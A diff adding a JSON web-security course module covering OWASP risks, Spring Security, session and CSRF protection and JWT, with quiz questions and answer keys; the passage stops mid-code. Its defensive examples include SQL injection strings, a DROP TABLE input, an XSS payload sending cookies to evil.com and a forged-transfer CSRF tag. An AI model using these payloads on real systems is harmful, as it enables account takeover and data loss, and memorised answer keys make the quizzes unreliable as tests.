@@ -8005,6 +8005,415 @@
           ]
         }
       ]
+    },
+    {
+      "id": "module-security",
+      "title": "Security: Sessions & JWT",
+      "description": "Master web application security from fundamentals through Spring Security, session-based authentication, JWT tokens, and role-based access control.",
+      "difficulty": "advanced",
+      "estimatedHours": 3.25,
+      "lessons": [
+        {
+          "id": "security-lesson-1",
+          "title": "Lesson S.1: Web Security Fundamentals",
+          "moduleId": "module-security",
+          "order": 1,
+          "estimatedMinutes": 35,
+          "difficulty": "intermediate",
+          "contentSections": [
+            {
+              "type": "THEORY",
+              "title": "The Problem: Your App is Under Attack",
+              "content": "The moment you deploy a web application, you become a target:\n\nREAL STATISTICS (2024):\n- 30,000+ websites hacked DAILY\n- Average data breach cost: $4.45 million\n- 43% of attacks target small businesses\n- 60% of breached companies close within 6 months\n\nCommon attack scenarios:\n\n1. CREDENTIAL STUFFING:\nAttacker uses leaked username/password pairs from other breaches.\nResult: Unauthorized access to user accounts.\n\n2. SESSION HIJACKING:\nAttacker steals session cookie.\nResult: Impersonates logged-in user without knowing password.\n\n3. SQL INJECTION:\nAttacker enters: ' OR '1'='1' -- in login form.\nResult: Bypasses authentication entirely.\n\n4. CROSS-SITE SCRIPTING (XSS):\nAttacker injects malicious JavaScript.\nResult: Steals cookies, redirects users, defaces site.\n\nSecurity isn't optional - it's survival."
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Authentication vs Authorization",
+              "content": "These terms are often confused but are fundamentally different:\n\nAUTHENTICATION (AuthN):\n- WHO are you?\n- Proving identity\n- Login process\n- Examples: username/password, fingerprint, OAuth\n\nAUTHORIZATION (AuthZ):\n- WHAT can you do?\n- Checking permissions\n- After authentication\n- Examples: admin vs user roles, read vs write access\n\nReal-world analogy:\n\nAUTHENTICATION: Showing your ID at the airport.\n'Yes, you are John Smith.'\n\nAUTHORIZATION: Checking your boarding pass.\n'John Smith can board Flight 123, seat 14A.'\n\nBoth are required for secure applications:\n1. First, verify WHO the user is (authentication)\n2. Then, determine WHAT they can access (authorization)"
+            },
+            {
+              "type": "THEORY",
+              "title": "OWASP Top 10: Critical Security Risks",
+              "content": "OWASP (Open Web Application Security Project) tracks the most critical risks:\n\n1. BROKEN ACCESS CONTROL (A01:2021)\n- Users access unauthorized functions/data\n- Example: Changing URL from /user/profile to /admin/panel\n\n2. CRYPTOGRAPHIC FAILURES (A02:2021)\n- Weak encryption, exposed sensitive data\n- Example: Storing passwords in plain text\n\n3. INJECTION (A03:2021)\n- SQL, NoSQL, OS command injection\n- Example: SELECT * FROM users WHERE id = '1; DROP TABLE users;--'\n\n4. INSECURE DESIGN (A04:2021)\n- Missing security controls by design\n- Example: No rate limiting on login attempts\n\n5. SECURITY MISCONFIGURATION (A05:2021)\n- Default credentials, unnecessary features enabled\n- Example: Debug mode left on in production\n\n6. VULNERABLE COMPONENTS (A06:2021)\n- Using libraries with known vulnerabilities\n- Example: Log4j vulnerability (CVE-2021-44228)\n\n7. AUTHENTICATION FAILURES (A07:2021)\n- Weak passwords, session fixation\n- Example: Allowing 'password123'\n\n8. DATA INTEGRITY FAILURES (A08:2021)\n- Untrusted deserialization, CI/CD compromise\n\n9. LOGGING FAILURES (A09:2021)\n- Not detecting breaches due to poor logging\n\n10. SSRF (A10:2021)\n- Server-side request forgery"
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Defense in Depth",
+              "content": "Security isn't one thing - it's LAYERS:\n\nLAYER 1: NETWORK\n- Firewalls, HTTPS, WAF (Web Application Firewall)\n- Block attacks before they reach your app\n\nLAYER 2: APPLICATION\n- Input validation, output encoding\n- Spring Security, authentication/authorization\n\nLAYER 3: DATA\n- Encryption at rest and in transit\n- Password hashing (bcrypt, Argon2)\n- Secure database access\n\nLAYER 4: MONITORING\n- Audit logs, intrusion detection\n- Alert on suspicious activity\n\nWHY LAYERS?\nIf one layer fails, others still protect you.\n\nExample: Attacker bypasses firewall\n-> Application validates input (blocked)\n-> Even if that fails, data is encrypted\n-> Even if accessed, monitoring detects it\n\nNo single control is perfect. Layers compensate for individual failures."
+            },
+            {
+              "type": "THEORY",
+              "title": "Common Attack Patterns",
+              "content": "Understanding attacks helps you defend:\n\nSQL INJECTION:\n// Vulnerable\nString query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\";\n// Input: ' OR '1'='1' --\n// Result: SELECT * FROM users WHERE name = '' OR '1'='1' --'\n// Returns ALL users!\n\nFIX: Use parameterized queries\nPreparedStatement ps = conn.prepareStatement(\n    \"SELECT * FROM users WHERE name = ?\");\nps.setString(1, userInput);  // Safely escaped\n\nCROSS-SITE SCRIPTING (XSS):\n// Vulnerable\n<p>Welcome, ${username}</p>\n// Input: <script>document.location='evil.com?c='+document.cookie</script>\n// Result: Steals cookies!\n\nFIX: Encode output\n<p>Welcome, ${fn:escapeXml(username)}</p>\n\nCROSS-SITE REQUEST FORGERY (CSRF):\n// Attacker's site has:\n<img src=\"https://yourbank.com/transfer?to=attacker&amount=10000\">\n// Victim's browser sends request with their cookies!\n\nFIX: CSRF tokens (covered in session lesson)"
+            },
+            {
+              "type": "WARNING",
+              "title": "Security Mindset",
+              "content": "NEVER trust user input. EVER.\n\nEverything from the client is potentially malicious:\n- Form fields\n- URL parameters\n- HTTP headers\n- Cookies\n- File uploads\n\nValidate on the SERVER, not just client-side:\n\n// Client validation (easily bypassed)\n<input type=\"email\" required>  // Attacker ignores this\n\n// Server validation (required)\nif (!isValidEmail(email)) {\n    throw new ValidationException(\"Invalid email\");\n}\n\nPrinciple of LEAST PRIVILEGE:\n- Give minimum permissions needed\n- Admin access only when required\n- Time-limited elevated access\n\nFAIL SECURELY:\n- On error, deny access (not grant)\n- Don't expose error details to users\n- Log security events for investigation"
+            }
+          ],
+          "challenges": [
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-1-mc-1",
+              "title": "Authentication vs Authorization",
+              "description": "Understanding the difference between AuthN and AuthZ",
+              "question": "A user logs into an e-commerce site and tries to access the admin dashboard. The system shows 'Access Denied - Administrators Only'. Which security control denied the request?",
+              "options": [
+                "Authentication - the user's identity couldn't be verified",
+                "Authorization - the user lacks permission for that resource",
+                "Encryption - the request wasn't properly secured",
+                "Input validation - the URL was malformed"
+              ],
+              "correctAnswer": 1,
+              "explanation": "The user successfully logged in (authentication passed), but lacks admin permissions (authorization failed). Authentication verifies WHO you are; authorization determines WHAT you can access. Here, the user is authenticated but not authorized for the admin dashboard.",
+              "difficulty": "intermediate"
+            },
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-1-mc-2",
+              "title": "OWASP Top 10",
+              "description": "Identifying common security vulnerabilities",
+              "question": "A developer writes: String query = \"SELECT * FROM products WHERE id = \" + productId; where productId comes from a URL parameter. What OWASP category does this vulnerability belong to?",
+              "options": [
+                "A01 - Broken Access Control",
+                "A02 - Cryptographic Failures",
+                "A03 - Injection",
+                "A07 - Authentication Failures"
+              ],
+              "correctAnswer": 2,
+              "explanation": "This is SQL Injection (A03 - Injection). User input is directly concatenated into a SQL query without sanitization. An attacker could input '1 OR 1=1' to bypass filters or '1; DROP TABLE products;--' to delete data. The fix is parameterized queries: PreparedStatement with '?' placeholders.",
+              "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "security-lesson-2",
+          "title": "Lesson S.2: Spring Security Basics",
+          "moduleId": "module-security",
+          "order": 2,
+          "estimatedMinutes": 40,
+          "difficulty": "intermediate",
+          "contentSections": [
+            {
+              "type": "THEORY",
+              "title": "Why Spring Security?",
+              "content": "You COULD implement security yourself:\n\n// DIY Authentication (DON'T DO THIS)\n@PostMapping(\"/login\")\npublic String login(String username, String password) {\n    User user = userRepo.findByUsername(username);\n    if (user != null && user.getPassword().equals(password)) {\n        session.setAttribute(\"user\", user);\n        return \"redirect:/dashboard\";\n    }\n    return \"redirect:/login?error\";\n}\n\nPROBLEMS:\n- Plain text password comparison\n- No brute force protection\n- No session fixation protection\n- No CSRF protection\n- No remember-me functionality\n- No logout handling\n- No concurrent session control\n\nSpring Security provides ALL of this out of the box:\n- Battle-tested by millions of applications\n- Updated for new vulnerabilities\n- Integrates with Spring ecosystem\n- Extensible for custom requirements\n\nDon't reinvent the wheel. Security is too important to get wrong."
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "The Security Filter Chain",
+              "content": "Spring Security works through a chain of filters:\n\nHTTP Request\n    |\n    v\n[SecurityFilterChain]\n    |\n    +-> SecurityContextPersistenceFilter (load security context)\n    +-> LogoutFilter (handle /logout)\n    +-> UsernamePasswordAuthenticationFilter (form login)\n    +-> BasicAuthenticationFilter (HTTP Basic)\n    +-> RequestCacheAwareFilter (saved request)\n    +-> SecurityContextHolderFilter\n    +-> SessionManagementFilter\n    +-> ExceptionTranslationFilter (handle auth exceptions)\n    +-> FilterSecurityInterceptor (authorization check)\n    |\n    v\nYour Controller\n\nEach filter has a specific responsibility:\n- Early filters: Extract credentials\n- Middle filters: Authenticate user\n- Late filters: Authorize request\n\nFilters can:\n- Pass request to next filter\n- Short-circuit (deny request)\n- Modify request/response\n\nYou configure WHAT to protect and HOW. Spring Security handles the rest."
+            },
+            {
+              "type": "THEORY",
+              "title": "Adding Spring Security",
+              "content": "Add the dependency:\n\n<!-- Maven -->\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n\nWith ZERO configuration, Spring Security:\n- Requires authentication for ALL endpoints\n- Generates a random password (check console logs)\n- Provides /login and /logout pages\n- Enables CSRF protection\n- Adds security headers\n\nConsole output:\nUsing generated security password: 8f3a7b2c-4d5e-6f7g-8h9i-0j1k2l3m4n5o\n\nDefault username: user\n\nThis is intentionally strict. You customize from a secure baseline rather than adding security later."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "Basic Security Configuration",
+              "content": "Customize security with SecurityFilterChain:",
+              "code": "import org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.core.userdetails.User;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.provisioning.InMemoryUserDetailsManager;\nimport org.springframework.security.web.SecurityFilterChain;\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        return http\n            // Define URL authorization rules\n            .authorizeHttpRequests(auth -> auth\n                // Public endpoints - no auth required\n                .requestMatchers(\"/\", \"/home\", \"/public/**\").permitAll()\n                .requestMatchers(\"/css/**\", \"/js/**\", \"/images/**\").permitAll()\n                // Admin endpoints - ADMIN role required\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                // API endpoints - authenticated users only\n                .requestMatchers(\"/api/**\").authenticated()\n                // Everything else - authenticated\n                .anyRequest().authenticated()\n            )\n            // Enable form-based login\n            .formLogin(form -> form\n                .loginPage(\"/login\")        // Custom login page\n                .defaultSuccessUrl(\"/dashboard\", true)\n                .permitAll()\n            )\n            // Enable logout\n            .logout(logout -> logout\n                .logoutSuccessUrl(\"/login?logout\")\n                .permitAll()\n            )\n            .build();\n    }\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        // In-memory users for demo (use database in production!)\n        var user = User.builder()\n            .username(\"user\")\n            .password(passwordEncoder().encode(\"password\"))\n            .roles(\"USER\")\n            .build();\n\n        var admin = User.builder()\n            .username(\"admin\")\n            .password(passwordEncoder().encode(\"admin123\"))\n            .roles(\"USER\", \"ADMIN\")\n            .build();\n\n        return new InMemoryUserDetailsManager(user, admin);\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n}",
+              "language": "java"
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Authorization Matchers",
+              "content": "Spring Security 6 uses requestMatchers() with various matching strategies:\n\nBY PATH:\n.requestMatchers(\"/admin/**\")           // /admin/anything\n.requestMatchers(\"/api/users/{id}\")     // Path variable\n.requestMatchers(\"/public\", \"/home\")   // Multiple paths\n\nBY HTTP METHOD:\n.requestMatchers(HttpMethod.GET, \"/api/**\")    // GET only\n.requestMatchers(HttpMethod.POST, \"/api/**\")   // POST only\n.requestMatchers(HttpMethod.DELETE, \"/admin/**\") // DELETE only\n\nAUTHORIZATION RULES:\n.permitAll()              // No authentication required\n.authenticated()          // Must be logged in\n.hasRole(\"ADMIN\")         // Must have ADMIN role\n.hasAnyRole(\"ADMIN\", \"MANAGER\")  // Any of these roles\n.hasAuthority(\"WRITE_PERMISSION\") // Specific authority\n.denyAll()                // Never allow\n\nORDER MATTERS!\nRules are evaluated top to bottom. First match wins.\n\n// WRONG - /admin/public is protected!\n.requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n.requestMatchers(\"/admin/public\").permitAll()\n\n// RIGHT - specific rule first\n.requestMatchers(\"/admin/public\").permitAll()\n.requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")"
+            },
+            {
+              "type": "WARNING",
+              "title": "Spring Security 6 Migration Notes",
+              "content": "If you see old tutorials, note these Spring Security 6 changes:\n\nOLD (Spring Security 5.x):\n@EnableWebSecurity\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n    @Override\n    protected void configure(HttpSecurity http) {\n        http.authorizeRequests()\n            .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n    }\n}\n\nNEW (Spring Security 6.x):\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        return http\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n            )\n            .build();\n    }\n}\n\nKEY CHANGES:\n- No more extending WebSecurityConfigurerAdapter (deprecated)\n- authorizeRequests() -> authorizeHttpRequests()\n- antMatchers() -> requestMatchers()\n- Method returns SecurityFilterChain bean\n- Lambda DSL is the standard"
+            },
+            {
+              "type": "THEORY",
+              "title": "Password Encoding",
+              "content": "NEVER store passwords in plain text:\n\n// CATASTROPHICALLY WRONG\nuser.setPassword(rawPassword);  // Stored as-is\n\n// If database is breached, all passwords exposed!\n\nALWAYS hash passwords:\n\n@Bean\npublic PasswordEncoder passwordEncoder() {\n    return new BCryptPasswordEncoder();\n}\n\n// Registration\nString hashedPassword = passwordEncoder.encode(rawPassword);\nuser.setPassword(hashedPassword);\n// Stored: $2a$10$N9qo8uLOickgx2ZMRZoMy...\n\n// Login - Spring Security handles this automatically!\n// It compares: encoder.matches(rawPassword, storedHash)\n\nWHY BCrypt?\n- Intentionally slow (prevents brute force)\n- Built-in salt (prevents rainbow tables)\n- Adjustable cost factor\n- Industry standard\n\nBCrypt cost factor:\nnew BCryptPasswordEncoder(12)  // 2^12 iterations\n// Higher = more secure but slower\n// 10 is default, 12+ recommended for 2025"
+            }
+          ],
+          "challenges": [
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-2-mc-1",
+              "title": "Filter Chain Order",
+              "description": "Understanding security rule evaluation",
+              "question": "Given this configuration:\n.requestMatchers(\"/api/**\").authenticated()\n.requestMatchers(\"/api/public\").permitAll()\nWhat happens when an unauthenticated user accesses /api/public?",
+              "options": [
+                "Access granted - permitAll() applies",
+                "Access denied - /api/** rule matches first",
+                "Error - conflicting rules",
+                "Redirected to login - needs authentication"
+              ],
+              "correctAnswer": 1,
+              "explanation": "Authorization rules are evaluated top-to-bottom, first match wins. '/api/**' matches '/api/public' before the specific rule is reached. The request requires authentication. To allow public access, put the specific rule FIRST: .requestMatchers(\"/api/public\").permitAll() then .requestMatchers(\"/api/**\").authenticated()",
+              "difficulty": "intermediate"
+            },
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-2-mc-2",
+              "title": "Password Storage",
+              "description": "Understanding secure password practices",
+              "question": "Why is BCrypt preferred over SHA-256 for password hashing?",
+              "options": [
+                "BCrypt produces longer hashes",
+                "BCrypt is intentionally slow and includes salting",
+                "BCrypt is newer and therefore better",
+                "BCrypt uses symmetric encryption"
+              ],
+              "correctAnswer": 1,
+              "explanation": "BCrypt is designed for passwords: it's intentionally slow (configurable work factor) to resist brute force, and includes automatic salting to prevent rainbow table attacks. SHA-256 is fast (good for data integrity, bad for passwords) and requires manual salt management. Speed is a liability for password hashing.",
+              "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "security-lesson-3",
+          "title": "Lesson S.3: Session-Based Authentication",
+          "moduleId": "module-security",
+          "order": 3,
+          "estimatedMinutes": 40,
+          "difficulty": "intermediate",
+          "contentSections": [
+            {
+              "type": "THEORY",
+              "title": "How Sessions Work",
+              "content": "HTTP is stateless - each request is independent. Sessions add state:\n\n1. USER LOGS IN:\nPOST /login\nBody: username=john&password=secret\n\n2. SERVER CREATES SESSION:\n- Validates credentials\n- Creates session object with unique ID\n- Stores user info in session (server-side)\n- Returns session ID in cookie\n\nSet-Cookie: JSESSIONID=ABC123; HttpOnly; Secure\n\n3. SUBSEQUENT REQUESTS:\nGET /dashboard\nCookie: JSESSIONID=ABC123\n\n4. SERVER LOOKS UP SESSION:\n- Finds session by ID\n- Retrieves stored user info\n- Knows who is making request\n\nKEY POINT: Session DATA is stored SERVER-SIDE.\nThe cookie only contains the session ID (a random string).\nClient never sees password, user details, or permissions."
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Session Security Concerns",
+              "content": "Sessions have specific vulnerabilities:\n\nSESSION HIJACKING:\nIf attacker gets your session cookie, they become you.\n\nProtections:\n- HttpOnly: JavaScript can't read cookie\n- Secure: Cookie only sent over HTTPS\n- SameSite: Prevents cross-site cookie sending\n\nSet-Cookie: JSESSIONID=ABC123; HttpOnly; Secure; SameSite=Strict\n\nSESSION FIXATION:\nAttacker sets YOUR session ID before you log in,\nthen uses same ID after you authenticate.\n\nProtection: Generate NEW session ID on login.\n\nSpring Security does this automatically:\nhttp.sessionManagement(session -> session\n    .sessionFixation().changeSessionId()  // Default!\n)\n\nSESSION TIMEOUT:\nSessions should expire after inactivity.\n\napplication.properties:\nserver.servlet.session.timeout=30m  # 30 minutes"
+            },
+            {
+              "type": "THEORY",
+              "title": "Form Login with Spring Security",
+              "content": "Spring Security's form login handles:\n- Login page generation (or custom)\n- Credential validation\n- Session creation\n- Remember-me (optional)\n- Login success/failure handling\n\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    return http\n        .formLogin(form -> form\n            .loginPage(\"/login\")              // Custom login page\n            .loginProcessingUrl(\"/perform_login\")  // Form action URL\n            .usernameParameter(\"email\")       // Custom field name\n            .passwordParameter(\"pwd\")         // Custom field name\n            .defaultSuccessUrl(\"/dashboard\")  // After login\n            .failureUrl(\"/login?error=true\")  // On failure\n            .successHandler(customSuccessHandler)  // Custom logic\n            .failureHandler(customFailureHandler)\n            .permitAll()\n        )\n        .build();\n}\n\nCustom login page (Thymeleaf):\n<form th:action=\"@{/perform_login}\" method=\"post\">\n    <input type=\"text\" name=\"email\" placeholder=\"Email\">\n    <input type=\"password\" name=\"pwd\" placeholder=\"Password\">\n    <button type=\"submit\">Login</button>\n</form>"
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "CSRF Protection",
+              "content": "Cross-Site Request Forgery protection is CRITICAL for sessions:",
+              "code": "// CSRF Attack scenario:\n// 1. User logs into yourbank.com\n// 2. User visits evil-site.com\n// 3. Evil site has:\n//    <img src=\"https://yourbank.com/transfer?to=attacker&amount=10000\">\n// 4. Browser sends request WITH user's session cookie!\n// 5. Bank processes transfer - user never clicked anything\n\n// CSRF TOKEN PROTECTION:\n// Spring Security generates unique token per session\n// Token must be included in state-changing requests\n// Attacker can't know the token!\n\n// Thymeleaf form (token added automatically):\n<form th:action=\"@{/transfer}\" method=\"post\">\n    <!-- Spring adds: <input type=\"hidden\" name=\"_csrf\" value=\"abc123\"> -->\n    <input type=\"text\" name=\"to\" placeholder=\"Recipient\">\n    <input type=\"number\" name=\"amount\" placeholder=\"Amount\">\n    <button type=\"submit\">Transfer</button>\n</form>\n\n// For AJAX requests, include token in header:\nconst csrfToken = document.querySelector('meta[name=\"_csrf\"]').content;\nconst csrfHeader = document.querySelector('meta[name=\"_csrf_header\"]').content;\n\nfetch('/api/transfer', {\n    method: 'POST',\n    headers: {\n        [csrfHeader]: csrfToken,  // X-CSRF-TOKEN: abc123\n        'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ to: 'recipient', amount: 100 })\n});\n\n// In HTML head:\n<meta name=\"_csrf\" th:content=\"${_csrf.token}\">\n<meta name=\"_csrf_header\" th:content=\"${_csrf.headerName}\">",
+              "language": "java"
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "Session Management Configuration",
+              "content": "Control session behavior:\n\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    return http\n        .sessionManagement(session -> session\n            // What to do with session ID on authentication\n            .sessionFixation().changeSessionId()  // Safest (default)\n            \n            // Concurrent session control\n            .maximumSessions(1)                   // Only 1 session per user\n            .maxSessionsPreventsLogin(true)       // Block new login\n            // OR .maxSessionsPreventsLogin(false) // Kick out old session\n            \n            // Session creation policy\n            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n            // IF_REQUIRED: Create when needed (default)\n            // ALWAYS: Always create\n            // NEVER: Never create (but use if exists)\n            // STATELESS: Never create or use (for JWT)\n            \n            // Invalid session handling\n            .invalidSessionUrl(\"/login?expired\")\n        )\n        .build();\n}\n\nConcurrent session control prevents:\n- Account sharing\n- Session persistence after password change\n- Forgotten logins on public computers"
+            },
+            {
+              "type": "THEORY",
+              "title": "Sessions in Distributed Systems",
+              "content": "Session storage becomes complex with multiple servers:\n\nPROBLEM:\nServer A creates session, stores in memory.\nLoad balancer sends next request to Server B.\nServer B doesn't have that session - user logged out!\n\nSOLUTIONS:\n\n1. STICKY SESSIONS:\nLoad balancer always sends user to same server.\nProblem: Server dies, sessions lost.\n\n2. SESSION REPLICATION:\nServers sync sessions with each other.\nProblem: Network overhead, complexity.\n\n3. CENTRALIZED SESSION STORE:\nAll servers use shared store (Redis, database).\nBest for most applications.\n\nSpring Session with Redis:\n\n<dependency>\n    <groupId>org.springframework.session</groupId>\n    <artifactId>spring-session-data-redis</artifactId>\n</dependency>\n\napplication.properties:\nspring.session.store-type=redis\nspring.redis.host=localhost\nspring.redis.port=6379\n\nNow sessions survive server restarts and work across instances.\n\n4. STATELESS (JWT):\nNo server-side session at all.\nCovered in next lesson!"
+            },
+            {
+              "type": "WARNING",
+              "title": "Session Security Checklist",
+              "content": "Before deploying, verify:\n\n[] Cookie Flags:\n   - HttpOnly: Prevents XSS stealing cookies\n   - Secure: HTTPS only\n   - SameSite=Strict or Lax\n\napplication.properties:\nserver.servlet.session.cookie.http-only=true\nserver.servlet.session.cookie.secure=true\nserver.servlet.session.cookie.same-site=strict\n\n[] Session Timeout:\n   - Set appropriate timeout\n   - Balance security vs user experience\n\nserver.servlet.session.timeout=30m\n\n[] Session Fixation:\n   - Generate new ID on login (Spring default)\n\n[] Logout:\n   - Invalidate session completely\n   - Clear remember-me tokens\n\n.logout(logout -> logout\n    .logoutUrl(\"/logout\")\n    .invalidateHttpSession(true)\n    .clearAuthentication(true)\n    .deleteCookies(\"JSESSIONID\", \"remember-me\")\n)\n\n[] CSRF:\n   - Enabled for browser-based apps\n   - Token in forms and AJAX"
+            }
+          ],
+          "challenges": [
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-3-mc-1",
+              "title": "CSRF Protection",
+              "description": "Understanding CSRF attacks and defenses",
+              "question": "Why doesn't CSRF protection help against an attacker who has XSS (cross-site scripting) on your site?",
+              "options": [
+                "XSS can read the CSRF token from the page and include it in requests",
+                "CSRF tokens expire too quickly for XSS to use",
+                "XSS only works on static pages, not dynamic content",
+                "CSRF protection encrypts tokens that XSS cannot decrypt"
+              ],
+              "correctAnswer": 0,
+              "explanation": "XSS allows attackers to run JavaScript in your site's context. This JavaScript can read the CSRF token from the page (it's in the DOM) and include it in malicious requests. XSS completely bypasses CSRF protection - this is why preventing XSS is critical. Never trust user input in rendered HTML.",
+              "difficulty": "intermediate"
+            },
+            {
+              "type": "MULTIPLE_CHOICE",
+              "id": "security-lesson-3-mc-2",
+              "title": "Session Storage",
+              "description": "Understanding session scalability",
+              "question": "Your application runs on 4 servers behind a load balancer. Users report being randomly logged out. What's the most likely cause and best solution?",
+              "options": [
+                "Session timeout too short - increase timeout",
+                "Sessions stored in server memory - use Redis for shared storage",
+                "CSRF tokens expiring - disable CSRF protection",
+                "Cookies blocked by browser - use URL session IDs"
+              ],
+              "correctAnswer": 1,
+              "explanation": "With in-memory sessions and multiple servers, users get logged out when the load balancer routes them to a different server than the one holding their session. The solution is centralized session storage (Redis, database) that all servers can access. Sticky sessions are a workaround but don't handle server failures.",
+              "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "security-lesson-4",
+          "title": "Lesson S.4: JWT Authentication",
+          "moduleId": "module-security",
+          "order": 4,
+          "estimatedMinutes": 45,
+          "difficulty": "advanced",
+          "contentSections": [
+            {
+              "type": "THEORY",
+              "title": "The Problem with Sessions",
+              "content": "Sessions work but have limitations:\n\n1. STATEFUL:\nServer must store session data.\nWith millions of users = millions of session objects.\nMemory-intensive, requires shared storage.\n\n2. SCALING COMPLEXITY:\nNew server? Must access session store.\nMultiple data centers? Session replication across regions.\nMicroservices? Each service needs session access.\n\n3. MOBILE/SPA CHALLENGES:\nCookies don't work well for native mobile apps.\nCross-origin requests complicate cookie handling.\nMultiple clients need different session management.\n\nJWT SOLUTION:\nInstead of storing session on server...\nEncode user info IN the token itself.\nServer validates token - no lookup needed.\nTRULY STATELESS authentication."
+            },
+            {
+              "type": "KEY_POINT",
+              "title": "JWT Structure",
+              "content": "JWT (JSON Web Token) has three parts:\n\nHEADER.PAYLOAD.SIGNATURE\n\nHEADER (Algorithm & Type):\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\nBase64URL encoded: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nPAYLOAD (Claims - the data):\n{\n  \"sub\": \"user-123\",           // Subject (user ID)\n  \"name\": \"John Doe\",\n  \"roles\": [\"USER\", \"ADMIN\"],\n  \"iat\": 1516239022,           // Issued At\n  \"exp\": 1516242622            // Expiration\n}\nBase64URL encoded: eyJzdWIiOiJ1c2VyLTEyMyIsIm5hbWUiOiJKb2huIERvZSJ9\n\nSIGNATURE:\nHMAC-SHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n\nFULL TOKEN:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJzdWIiOiJ1c2VyLTEyMyIsIm5hbWUiOiJKb2huIERvZSJ9.\nSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nCAUTION: Payload is ENCODED, not ENCRYPTED.\nAnyone can decode and read it. Never put secrets in JWT!"
+            },
+            {
+              "type": "THEORY",
+              "title": "How JWT Authentication Works",
+              "content": "1. LOGIN REQUEST:\nPOST /api/auth/login\n{\"username\": \"john\", \"password\": \"secret\"}\n\n2. SERVER VALIDATES & CREATES TOKEN:\n- Check credentials against database\n- Create JWT with user info + expiration\n- Sign with server's secret key\n- Return token to client\n\n{\"token\": \"eyJhbGci...\", \"expiresIn\": 3600}\n\n3. CLIENT STORES TOKEN:\n- localStorage (convenient but XSS vulnerable)\n- httpOnly cookie (more secure)\n- Memory (most secure, lost on refresh)\n\n4. AUTHENTICATED REQUESTS:\nGET /api/profile\nAuthorization: Bearer eyJhbGci...\n\n5. SERVER VALIDATES TOKEN:\n- Extract token from header\n- Verify signature (proves it wasn't tampered)\n- Check expiration\n- Extract user info from payload\n- Process request\n\nNO DATABASE LOOKUP needed to validate!\nToken contains everything needed to authenticate."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "JWT Security Configuration",
+              "content": "Complete Spring Security 6 JWT setup:",
+              "code": "@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    private final JwtAuthenticationFilter jwtAuthFilter;\n    private final AuthenticationProvider authenticationProvider;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        return http\n            // Disable CSRF - not needed for stateless JWT\n            .csrf(csrf -> csrf.disable())\n            \n            // Stateless session - no server-side session\n            .sessionManagement(session ->\n                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n            \n            // Authorization rules\n            .authorizeHttpRequests(auth -> auth\n                // Public endpoints\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(\"/api/public/**\").permitAll()\n                // Admin endpoints\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                // All other API endpoints require authentication\n                .anyRequest().authenticated()\n            )\n            \n            // Set authentication provider\n            .authenticationProvider(authenticationProvider)\n            \n            // Add JWT filter BEFORE username/password filter\n            .addFilterBefore(jwtAuthFilter, \n                UsernamePasswordAuthenticationFilter.class)\n            \n            .build();\n    }\n}\n\n// JWT Authentication Filter\n@Component\n@RequiredArgsConstructor\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    private final JwtService jwtService;\n    private final UserDetailsService userDetailsService;\n\n    @Override\n    protected void doFilterInternal(\n            HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain) throws ServletException, IOException {\n        \n        // Extract Authorization header\n        final String authHeader = request.getHeader(\"Authorization\");\n        \n        // Check for Bearer token\n        if 